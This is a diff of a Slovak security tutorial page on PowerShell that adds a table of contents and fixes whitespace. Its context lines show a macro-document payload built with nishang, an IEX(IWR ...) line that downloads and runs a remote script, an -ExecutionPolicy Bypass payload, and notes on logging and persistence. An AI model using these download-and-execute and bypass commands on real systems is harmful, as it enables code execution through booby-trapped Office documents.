@@ -8,6 +8,12 @@ permalink: /sk/powershell/
 sitemap: false
 ---
 
+## Obsah
+{:.no_toc}
+
+* This is a TOC placeholder.
+{:toc}
+
 ## Office dokument s&nbsp;automaticky spúšťaným makrom
 
 Vytvorte Office dokument (Word / Excel / PowerPoint) a&nbsp;vložte do&nbsp;neho cez&nbsp;makrá tento kód:
@@ -35,7 +41,7 @@ End Sub
 ```powershell
 # Import prikazu Out-Word z modulu nishang
 IEX(IWR 'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1')
- 
+
 # Vytvorenie payloadu
 $payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"
 
@@ -155,8 +161,8 @@ powershell.exe -ExecutionPolicy Bypass ...
 
 [Script Tracing and&nbsp;Logging](https://docs.microsoft.com/en-us/powershell/wmf/5.0/audit_script)
 
-[PowerShell 5 Logging](https://www.rootusers.com/enable-and-configure-module-script-block-and-transcription-logging-in-windows-powershell/)[  
-<img class="aligncenter" src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png" alt="" width="501" height="319" />](https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png) 
+[PowerShell 5 Logging](https://www.rootusers.com/enable-and-configure-module-script-block-and-transcription-logging-in-windows-powershell/)[
+<img class="aligncenter" src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png" alt="" width="501" height="319" />](https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png)
 
 ## Perzistencia
 
@@ -257,7 +263,7 @@ function Get-PrivateProfileString
         )
     $builder = [System.Text.StringBuilder]::new(1024)
     $result = [Win32Utils.INIFile]::GetPrivateProfileString($category, $key, "", $builder, $builder.Capacity, $file)
-    return $builder.ToString() 
+    return $builder.ToString()
 }
 
 # Zavoláme funkciu
@@ -280,25 +286,25 @@ $scriptBlock = [Scriptblock]::Create($script.Content)
 # Obalíme ho funkciou s definíciou signatúry
 function Get-PrivateProfileString2
 {
-param( 
-    [string] $File, 
-    [string] $category, 
+param(
+    [string] $File,
+    [string] $category,
     [string] $Key)
 
-## Prepare the parameter types and parameter values for the Invoke-WindowsApi script 
-$returnValue = New-Object System.Text.StringBuilder 500 
-$parameterTypes = [string], [string], [string], [System.Text.StringBuilder], [int], [string] 
+## Prepare the parameter types and parameter values for the Invoke-WindowsApi script
+$returnValue = New-Object System.Text.StringBuilder 500
+$parameterTypes = [string], [string], [string], [System.Text.StringBuilder], [int], [string]
 $parameters = $Category,
               $Key,
               '',
               [System.Text.StringBuilder] $returnValue,
               [int] $returnValue.Capacity,
               $File
-## Invoke the API 
+## Invoke the API
 # [void] (Invoke-WindowsApi "kernel32.dll" ([UInt32]) "GetPrivateProfileString" $parameterTypes $parameters)
 Invoke-Command -ScriptBlock $scriptBlock -ArgumentList 'kernel32.dll',([UInt32]),'GetPrivateProfileString',$parameterTypes,$parameters > $null
 
-## And return the results 
+## And return the results
 $returnValue.ToString()
 }
 
